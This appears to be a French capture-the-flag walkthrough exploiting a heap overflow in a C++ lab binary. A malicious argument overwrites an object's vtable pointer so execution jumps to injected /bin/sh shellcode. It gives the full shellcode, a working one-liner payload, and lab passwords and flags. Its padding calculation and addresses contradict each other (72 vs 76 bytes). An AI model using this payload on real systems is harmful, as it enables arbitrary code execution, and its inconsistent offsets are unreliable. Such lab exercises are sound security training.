# Level9 - Walkthrough

## Objectif
Exploiter un buffer overflow dans une classe C++ pour corrompre la vtable d'un objet et rediriger l'exécution vers un shellcode injecté.

---

## Étape 1 : Connexion
```bash
ssh level9@localhost -p 4242
# Mot de passe : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## Étape 2 : Reconnaissance
```bash
ls -la
./level9
# Segmentation fault (sans arguments)

./level9 test
# (pas de sortie visible)

./level9 AAAA
# (pas de sortie visible)
```

Le programme nécessite 1 argument et ne crash pas avec des petites strings.

---

## Étape 3 : Analyser le code C++

Analyser le binaire dans Ghidra révèle du **C++** avec une classe `N` :

### Main
```cpp
void main(int argc, char **argv)
{
  N *obj1;
  N *obj2;
  
  if (argc < 2) {
    _exit(1);
  }
  
  obj1 = new N(5);                    // Alloue 108 bytes (0x6c)
  obj2 = new N(6);                    // Alloue 108 bytes (0x6c)
  
  obj1->setAnnotation(argv[1]);       // Copie argv[1] dans obj1
  
  obj2->operator+(obj1);              // Appel via vtable
}
```

### Classe N
```cpp
class N {
  void *vtable;           // +0x00 (offset 0)   : pointeur vtable
  char buffer[100];       // +0x04 (offset 4)   : buffer annotation
  int value;              // +0x68 (offset 104) : valeur (5 ou 6)
};

// Constructeur
N::N(int val) {
  this->vtable = &vtable_N;         // Initialise vtable
  this->value = val;
}

// Méthode vulnérable
void N::setAnnotation(char *str) {
  size_t len = strlen(str);
  memcpy(this + 4, str, len);       // PAS DE VÉRIFICATION DE TAILLE !
}

// Opérateur surchargé
int N::operator+(N *other) {
  return this->value + other->value;
}
```

**La vulnérabilité :** `memcpy` sans limite dans `setAnnotation()`.

---

## Étape 4 : Identifier la vulnérabilité

### Structure des objets sur la heap
```
obj1 (0x0804a008):
  +0x00: [vtable pointer]    4 bytes
  +0x04: [buffer]            100 bytes
  +0x68: [int value]         4 bytes
  Total: 108 bytes

obj2 (0x0804a074 = 0x0804a008 + 0x6c):
  +0x00: [vtable pointer]    4 bytes
  +0x04: [buffer]            100 bytes
  +0x68: [int value]         4 bytes
```

### Le problème

Si `argv[1]` dépasse 104 bytes :
- On déborde du buffer de `obj1`
- On **écrase la vtable de obj2**
- Quand `obj2->operator+()` est appelé, il utilise notre fausse vtable !

---

## Étape 5 : Stratégie d'exploitation

### Plan d'attaque

1. **Créer une fausse vtable** au début de notre payload
2. **Injecter un shellcode** juste après
3. **Remplir avec du padding** pour atteindre la vtable de obj2
4. **Écraser la vtable de obj2** avec l'adresse de notre fausse vtable
5. Quand `operator+` est appelé, il exécute notre shellcode !

### Layout du payload
```
[Fausse vtable: 4 bytes] + [Shellcode: 28 bytes] + [Padding: 76 bytes] + [Adresse vtable: 4 bytes]
```

---

## Étape 6 : Construction du payload

### Adresses critiques

Les objets sont alloués sur la heap à partir de `0x0804a008` :
```
obj1 = 0x0804a008
obj1 + 4 = 0x0804a00c      ← Début du buffer (où commence notre payload)
obj1 + 4 + 4 = 0x0804a010  ← Adresse du shellcode
obj2 = 0x0804a074           ← Début de obj2 (vtable à écraser)
```

### Composants du payload

**[1] Fausse vtable (4 bytes)** : `\x10\xa0\x04\x08`
- Adresse little-endian : `0x0804a010`
- Pointe vers notre shellcode (après ces 4 bytes)

**[2] Shellcode x86 (28 bytes)** :
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```
Fait `execve("/bin/sh", NULL, NULL)`

**[3] Padding (76 bytes)** : `"A" * 76`
- Distance : 4 (vtable obj1) + 100 (buffer) = 104 bytes
- Déjà utilisé : 4 (fausse vtable) + 28 (shellcode) = 32 bytes
- Padding nécessaire : 104 - 32 = 72 bytes... 

Attends, recalculons :
- obj1 fait 108 bytes total (0x6c)
- On écrit à partir de `obj1 + 4`
- Pour atteindre `obj2` (offset 108 depuis obj1), il faut : 108 - 4 = 104 bytes
- Déjà écrit : 4 (fausse vtable) + 28 (shellcode) = 32 bytes
- Padding : 104 - 32 = 72 bytes

Mais le payload original utilise 76... Testons les deux !

**[4] Adresse de la fausse vtable (4 bytes)** : `\x0c\xa0\x04\x08`
- Adresse little-endian : `0x0804a00c`
- Écrase la vtable de obj2
- Pointe vers le début de notre buffer qui contient `0x0804a010`

---

## Étape 7 : Fonctionnement de l'attaque

### Après setAnnotation(argv[1])
```
Heap layout:

0x0804a008: [obj1 vtable original] ← écrasé
0x0804a00c: [0x0804a010]           ← Fausse vtable [1]
0x0804a010: [shellcode 28 bytes]   ← [2]
0x0804a02c: [AAAAAAA... 76 bytes]  ← [3]
0x0804a078: [0x0804a00c]           ← [4] Écrase vtable de obj2 !
```

### Quand operator+ est appelé
```cpp
obj2->operator+(obj1);
```

1. Le programme lit `obj2->vtable` → trouve `0x0804a00c`
2. Lit la première entrée de cette "vtable" → trouve `0x0804a010`
3. **Appelle cette adresse** → Exécute notre shellcode !
4. Le shellcode lance `/bin/sh` → Shell obtenu !

---

## Étape 8 : Exploitation
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
```

Résultat : Shell obtenu !
```bash
cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
```bash
su bonus0
# Mot de passe : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## Flag
```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## Type de vulnérabilité

- **Heap buffer overflow** : Débordement dans `memcpy` sans vérification de taille
- **vtable hijacking** : Corruption du pointeur de table virtuelle C++
- **ret2shellcode** : Redirection vers du shellcode injecté

En C++, les objets avec méthodes virtuelles stockent un pointeur vers leur vtable en début d'objet. En corrompant ce pointeur via un overflow, on peut rediriger l'exécution vers du code arbitraire lors de l'appel d'une méthode virtuelle.